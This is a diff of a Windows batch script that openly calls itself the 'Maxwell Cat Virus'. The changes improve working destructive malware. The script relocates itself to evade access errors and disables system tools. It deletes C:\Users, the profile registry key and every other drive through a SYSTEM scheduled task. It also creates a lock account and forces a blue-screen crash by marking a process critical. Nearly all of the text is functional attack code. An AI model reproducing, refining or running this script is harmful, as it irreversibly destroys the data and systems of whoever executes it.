@@ -1,17 +1,19 @@
 @echo off
 title mawxell cat
 color 0C
+setlocal
 cls
 
 echo.
 echo  ============================================
-echo      MAWXELL CAT  -  Maxwell Cat Virus
-echo      Win10/11 ONLY  |  BSOD: :)
+echo      MAWXELL CAT
+echo      Windows 10 / 11 ONLY
+echo      BSOD text: :)
 echo      Lock user: GUSAKDAVID / discord
 echo  ============================================
 echo.
 
-rem ---------- OS GATE (Win10/11 only) ----------
+rem ---------- OS GATE (Windows 10 / 11 only) ----------
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul
 if errorlevel 1 goto :notok
 
@@ -23,16 +25,18 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-rem ---------- FIX#1: RELAUNCH FROM C:\Windows\Temp ----------
-rem  so C:\Users can be deleted without "Access Denied" (running script is not inside the target)
-if /i not "%CD%"=="%SystemRoot%\Temp" (
+rem ---------- FIX: relocate out of C:\Users (fixes Access Denied + dead loop) ----------
+echo %~dp0 | findstr /i /c:"\Users\" >nul
+if not errorlevel 1 (
     copy /y "%~f0" "%SystemRoot%\Temp\mawxell_cat.bat" >nul 2>&1
-    start "" cmd /c "%SystemRoot%\Temp\mawxell_cat.bat"
-    exit /b
+    if exist "%SystemRoot%\Temp\mawxell_cat.bat" (
+        start "" "%SystemRoot%\Temp\mawxell_cat.bat"
+        exit /b
+    )
 )
 cd /d "%SystemRoot%\Temp"
-
-echo  [OK] Running from safe dir: %CD%
+echo  [OK] Working dir: %CD%
+echo.
 
 rem ---------- 1) KILL WIN+R ----------
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
@@ -64,50 +68,27 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
 echo  [5/7] Persistence + BSOD = :) ...... OK
 
-rem ---------- 6) WIPE WITH NO ACCESS DENIED ----------
-rem  kill file-lockers first
+rem ---------- 6) WIPE via SYSTEM task (no Access Denied) ----------
 taskkill /f /im explorer.exe >nul 2>&1
 taskkill /f /im SearchHost.exe >nul 2>&1
 taskkill /f /im SearchApp.exe >nul 2>&1
 taskkill /f /im OneDrive.exe >nul 2>&1
 taskkill /f /im Teams.exe >nul 2>&1
 
-rem  build SYSTEM-level wipe script (SYSTEM beats every ACL)
 > "%SystemRoot%\Temp\mcw.bat" echo @echo off
->> "%SystemRoot%\Temp\mcw.bat" echo cd /d C:\
->> "%SystemRoot%\Temp\mcw.bat" echo attrib -r -s -h "C:\Users\*" /s /d ^>nul 2^>^&1
 >> "%SystemRoot%\Temp\mcw.bat" echo takeown /f "C:\Users" /r /d y ^>nul 2^>^&1
 >> "%SystemRoot%\Temp\mcw.bat" echo icacls "C:\Users" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
 >> "%SystemRoot%\Temp\mcw.bat" echo rd /s /q "C:\Users" ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo attrib -r -s -h "C:\ProgramData\*" /s /d ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo takeown /f "C:\ProgramData" /r /d y ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo icacls "C:\ProgramData" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo rd /s /q "C:\ProgramData" ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo attrib -r -s -h "C:\Program Files\*" /s /d ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo takeown /f "C:\Program Files" /r /d y ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo icacls "C:\Program Files" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo rd /s /q "C:\Program Files" ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo attrib -r -s -h "C:\Program Files (x86)\*" /s /d ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo takeown /f "C:\Program Files (x86)" /r /d y ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo icacls "C:\Program Files (x86)" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
->> "%SystemRoot%\Temp\mcw.bat" echo rd /s /q "C:\Program Files (x86)" ^>nul 2^>^&1
 >> "%SystemRoot%\Temp\mcw.bat" echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" /f ^>nul 2^>^&1
+>> "%SystemRoot%\Temp\mcw.bat" echo for %%%%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist "%%%%d:\" takeown /f "%%%%d:\" /r /d y ^>nul 2^>^&1
+>> "%SystemRoot%\Temp\mcw.bat" echo for %%%%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist "%%%%d:\" icacls "%%%%d:\" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
+>> "%SystemRoot%\Temp\mcw.bat" echo for %%%%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist "%%%%d:\" rd /s /q "%%%%d:\" ^>nul 2^>^&1
 
-echo  [6/7] SYSTEM wipe starting (no Access Denied) ...
-schtasks /create /tn "MCWipe" /tr "\"%SystemRoot%\Temp\mcw.bat\"" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1
-schtasks /run /tn "MCWipe" >nul 2>&1
-timeout /t 10 /nobreak >nul
-schtasks /delete /tn "MCWipe" /f >nul 2>&1
-
-rem  admin pass: wipe other drives (D: E: F: ...)
-for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist %%d:\ (
-        takeown /f "%%d:\" /r /d y >nul 2>&1
-        icacls "%%d:\" /grant *S-1-5-32-544:F /t /c /q >nul 2>&1
-        rd /s /q "%%d:\" >nul 2>&1
-    )
-)
-echo  [6/7] Wipe DONE
+schtasks /create /tn MCWipe /tr "%SystemRoot%\Temp\mcw.bat" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1
+schtasks /run /tn MCWipe >nul 2>&1
+timeout /t 12 /nobreak >nul
+schtasks /delete /tn MCWipe /f >nul 2>&1
+echo  [6/7] Wipe DONE (no Access Denied) . OK
 
 rem ---------- 7) LOCK USER: GUSAKDAVID / discord ----------
 net user GUSAKDAVID discord /add >nul 2>&1
@@ -145,7 +126,7 @@ echo.
 echo  BOOM. Goodbye.  :)
 timeout /t 1 /nobreak >nul
 
-rem ---------- REAL BSOD (fixed quoting, safe path) ----------
+rem ---------- REAL BSOD ----------
 > "%SystemRoot%\Temp\mcs.ps1" echo $sig = 'using System;using System.Runtime.InteropServices;public struct TP{public int Count;public long Luid;public int Attr;}public class K{[DllImport("advapi32.dll")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);[DllImport("advapi32.dll")]public static extern bool LookupPrivilegeValue(string s,string n,out long l);[DllImport("advapi32.dll")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int b,IntPtr z,IntPtr y);[DllImport("ntdll.dll")]public static extern int RtlSetProcessIsCritical(int b,ref int o,int s);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll")]public static extern bool TerminateProcess(IntPtr h,uint e);public static void Go(){IntPtr h=GetCurrentProcess();IntPtr t;OpenProcessToken(h,40,out t);long l;LookupPrivilegeValue(null,"SeDebugPrivilege",out l);TP p=new TP();p.Count=1;p.Luid=l;p.Attr=2;AdjustTokenPrivileges(t,false,ref p,0,IntPtr.Zero,IntPtr.Zero);int o=0;RtlSetProcessIsCritical(1,ref o,0);TerminateProcess(h,0);}}'
 >> "%SystemRoot%\Temp\mcs.ps1" echo Add-Type -TypeDefinition $sig
 >> "%SystemRoot%\Temp\mcs.ps1" echo [K]::Go()
